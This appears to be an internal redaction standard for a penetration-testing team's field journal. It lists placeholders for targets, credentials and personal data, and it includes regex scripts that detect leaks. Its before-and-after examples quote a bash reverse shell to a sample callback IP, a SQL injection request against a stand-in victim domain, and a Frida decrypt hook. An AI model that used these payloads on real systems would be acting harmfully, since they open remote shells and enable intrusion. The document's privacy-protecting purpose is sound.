# Field-Journal Anonymization Standard

> When writing field-journal entries, submitting PRs, sharing payloads, or sending external reports you **must redact**. The placeholder convention below draws on the anonymization protocol of the PentAGI multi-agent system; the goal is to **preserve reusable value without exposing real targets**.

## Placeholder Master Table

### Network and Hosts

| Type | Placeholder | Applies To |
|------|-------|---------|
| Target IP | `{target_ip}` | pentest target host |
| Victim IP | `{victim_ip}` | next hop in internal lateral movement |
| Remote host | `{remote_host}` | generic remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback |
| Callback domain | `{callback_domain}` | OOB / reverse shells |
| Target domain | `{target_domain}` | web / mail targets |
| Victim domain | `{victim_domain}` | internal domain |
| Custom port | `{port}` | non-standard ports |
| Standard port | keep as-is | keep 80 / 443 / 22 / 445 / 3389 etc. for reuse |

### Credentials and Keys

| Type | Placeholder |
|------|-------|
| Username | `{username}` |
| Password | `{password}` |
| Hash | `{hash}` |
| Session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URLs and Endpoints

| Type | Placeholder |
|------|-------|
| Generic URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload endpoint | `{upload_endpoint}` |
| Login endpoint | `{login_endpoint}` |

### Paths

| Type | Placeholder |
|------|-------|
| Install directory | `{install_dir}` |
| Config file | `{config_path}` |
| Web root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business Identifiers

| Type | Placeholder |
|------|-------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Phone number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order number | `{order_id}` |
| UUID | `{uuid}` |

## What NOT to Redact

To keep the experience reusable, do **not replace** the following:

- CVE numbers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306 etc.)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## Context-Preservation Principle

When replacing, **preserve the semantic structure** so others can still tell what it is:

```python
# ❌ Replacing everything with X loses semantics
target = "X"
url = "X/X"

# ❌ Replacement too generic
target = "{target}"
url = "{url}"

# ✅ Preserve context
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload Redaction

### Web payload

```
Original: GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
      Host: shop.victim-corp.cn
      Cookie: PHPSESSID=abcdef123456

Redacted: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
      Host: {target_domain}
      Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Redacted
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// Redacted
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## Binary Sample Redaction

### Hashes

Just record the sha256; **do not attach the original file**. If you must share a sample:

- Upload to a public sample repository like VirusTotal or MalwareBazaar
- Link to someone else's already-analyzed same-hash sample

### Strings and Symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Redacted
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot Redaction

- Use mosaic or solid black to cover usernames, emails, phones, order numbers, and names
- In the URL bar, show only the domain structure (keep the path, mask the host), or replace everything
- Keep the first two octets of internal IP ranges: `10.0.x.x` instead of `10.0.10.50`
- Image elements identifying the company (logo / watermark) must be masked

## CTF Special Cases

CTF challenge text, target hostnames, and flag formats are **usually not sensitive** (the target is a public challenge), but:

- Treat self-deployed private ranges like real environments
- Flags from competitions still in progress must not be published
- Do not copy others' unpublished solutions directly into field-journal

## Automated Detection Script

After writing a field-journal entry, run the regexes below to catch missed redaction:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Mainland China phone number
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

Wrapped as `skills/scripts/scan-leaks.ps1` (PowerShell, PS 5.1 / pwsh compatible); run it before every submission:
```powershell
powershell -File skills/scripts/scan-leaks.ps1 -Path skills/field-journal
```
CI (the `leak-scan` job in ci.yml) already runs this script and fails on any un-redacted information.

## Reverse: Reading Others' Redacted Documents

When reading someone else's field-journal / writeup and you hit `{target_ip}`-style placeholders, **do not replace them with your own environment's real values and commit** — keep the placeholders unchanged.

## Field-Journal Checklist

Check this checklist before submitting a field-journal entry:

```
□ No public IPs (except CDN / public services)
□ No real domains (except demo domains like example.com)
□ No real credentials / tokens / hashes (replaced with {placeholder})
□ No names / employee IDs / emails leaking from screenshots
□ No sample files themselves (sha256 only)
□ JWT / OAuth codes / API keys fully replaced
□ Internal IP ranges masked to the first two octets (10.0.x.x)
□ Target parameters in payloads replaced with generic placeholders
□ Cookies and session ids replaced
```

Append this checklist directly to the end of `field-journal/_template.md`.